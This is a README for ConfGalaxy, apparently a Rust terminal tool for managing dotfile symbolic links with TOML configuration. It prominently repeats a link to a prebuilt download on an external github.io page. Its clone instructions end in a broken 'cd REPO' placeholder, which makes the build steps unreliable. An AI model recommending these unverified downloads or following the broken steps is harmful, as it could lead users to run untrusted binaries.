# ConfGalaxy - TUI Configuration Manager 2026

> **ConfGalaxy is a Linux terminal user interface for organizing dotfiles with configurable symbolic links. It uses TOML configuration and is written in Rust.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrewlzpagreen4070/confgalaxy-config-tui?style=flat-square)](https://github.com/andrewlzpagreen4070/confgalaxy-config-tui)

---

<p align="center">
  <a href="https://andrewlzpagreen4070.github.io/confgalaxy-config-tui/">
    <img src="https://img.shields.io/badge/Download-ConfGalaxy%20Latest-brightgreen?style=for-the-badge" alt="Download ConfGalaxy">
  </a>
</p>

> **[Download the latest ConfGalaxy build](https://andrewlzpagreen4070.github.io/confgalaxy-config-tui/)**

---

[Download Latest Build](https://andrewlzpagreen4070.github.io/confgalaxy-config-tui/)

---

## Overview

ConfGalaxy provides a terminal-driven way for Linux users to maintain dotfiles and related configuration paths. Rather than creating symbolic links manually each time, you can define link pairs and manage them from an interactive TUI.

The configuration workflow supports adding, modifying, deleting, and creating several entries together. Home paths can be shown in the compact `~` form, and missing parent directories are created automatically when required.

---

## Highlights

- Define and maintain symbolic link entries
- Create several selected links through a single operation
- Modify link definitions that already exist
- Delete configured link entries
- Automatically create missing parent directories for targets
- Convert home-directory paths to and from `~`
- Keep settings in TOML files
- Manage links through a terminal user interface
- Implemented in Rust with `ratatui` and `crossterm`
- Contains no unsafe Rust code

---

## Getting Started

### Download a prebuilt version

If a prebuilt Linux artifact is available, obtain it from the [latest build download](https://andrewlzpagreen4070.github.io/confgalaxy-config-tui/).

### Compile locally

Fetch the repository, then move into the project directory:

    git clone https://github.com/andrewlzpagreen4070/confgalaxy-config-tui.git
    cd REPO

Use Cargo to create a release build and run ConfGalaxy:

    cargo build --release
    cargo run --release

Cargo places the resulting executable at `target/release/`.

---

## Running ConfGalaxy

To start the application through Cargo, run:

    cargo run --release

A normal session can follow this sequence:

1. Launch the terminal interface.
2. Define a symbolic link for a dotfile or another configuration location.
3. Inspect and, if necessary, edit the source and destination paths.
4. Mark the entries that should be created.
5. Execute the batch creation command.
6. Adjust or remove entries later as your configuration structure evolves.

After building the project, the binary can also be started directly:

    ./target/release/confgalaxy

---

## TOML Configuration

ConfGalaxy stores link definitions in TOML. For example, one entry may look like this:

    [[links]]
    source = "~/.config/example/config.toml"
    target = "~/dotfiles/example/config.toml"

Configured entries are maintained from the terminal interface. Paths inside the home directory may use `~`, which ConfGalaxy expands or shortens during its configuration operations.

---

## System Requirements

- Linux
- A terminal emulator
- Rust and Cargo for source builds
- A writable filesystem location for symbolic links and automatically created parent directories
- A terminal environment that works with the `crossterm` interface

---

## Frequently Asked Questions

### What users should use ConfGalaxy?

It is intended for Linux users who maintain dotfiles or other configuration files through symbolic links.

### How can I change a link definition?

Select the appropriate entry in the terminal interface and choose the edit action to update its source or target path.

### Does it support creating multiple links at once?

Yes. Select the entries you want and run the batch creation workflow.

### Where does ConfGalaxy save its configuration?

The configuration format is TOML. The exact active location varies according to how the application was obtained and started; refer to the project files or distribution instructions for the relevant location.

### Are missing target directories handled automatically?

When configured links are created, ConfGalaxy can create target parent directories that do not yet exist.

### What can I do if the interface fails to launch?

Make sure the application is running on Linux and is being started from a terminal. Also check that the Rust build and terminal environment are compatible. For a local build, try:

    cargo build --release

---

## Future Work

- Further improve symbolic link entry handling
- Make batch link creation more capable
- Continue developing TOML configuration support
- Improve the usability of the terminal interface

---

## License

ConfGalaxy is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete license text.
